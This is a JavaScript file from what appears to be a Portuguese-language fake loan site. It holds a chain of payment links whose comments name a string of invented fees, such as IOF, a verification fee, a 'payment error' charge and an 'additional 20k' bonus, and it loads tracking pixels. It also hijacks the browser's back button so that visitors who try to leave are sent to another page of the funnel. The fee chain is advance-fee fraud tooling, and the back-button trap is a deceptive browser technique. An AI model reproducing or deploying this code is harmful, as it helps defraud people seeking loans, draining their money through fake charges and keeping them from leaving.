const baseLinks = {
  up1: "https://pay.agilemprestimo.site/DYp0ZxW9RJk3mvX", // IOF
  up2: "https://pay.agilemprestimo.site/nQ7kZ7RXn0030eJ", // Taxa de verificação de IOF
  up3: "https://pay.agilemprestimo.site/kYL6ge7lOddZrKM", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.agilemprestimo.site/6YQPgjJjb7qgpxz", // NFe
  up5: "https://pay.agilemprestimo.site/nQ7kZ7RXnbE30eJ", // Ativar conta
  up6: "https://pay.agilemprestimo.site/QqyLgqraeJj3vkE", // Taxa de registro do contrato
  up7: "https://pay.agilemprestimo.site/a6pVgdWMQkbGk7B", // Parabéns, 20k adicional
  up8: "https://pay.agilemprestimo.site/VroegNMXVO6GKwj", // Erro no pagamento - 14,06
  up9: "https://pay.agilemprestimo.site/kYL6ge7lj6qZrKM", // APP - 11,99
  up10: "https://pay.pagcheeckseguro.online/DYp0ZxWdy1l3mvX", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.pagcheeckseguro.online/QqyLgqrVyJX3vkE", // Taxa de Consultoria Financeira - 19,53
  up12: "https://pay.pagcheeckseguro.online/PVYB34EdNz5ZKzk", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}

// UTMIFY, troque o pixel só aqui, belê?
(function () {
  window.pixelId = "68af1a51390b0da1784d4f3e";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
})();

(function () {
  const script = document.createElement("script");

  script.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
  script.setAttribute("data-utmify-prevent-xcod-sck", "");
  script.setAttribute("data-utmify-prevent-subids", "");
  script.async = true;
  script.defer = true;

  document.head.appendChild(script);
})();

const backRedirectBackLink =
  "https://agilemprestimosoficial.site/agil-type-vega/up/back/";

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegação para trás e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};
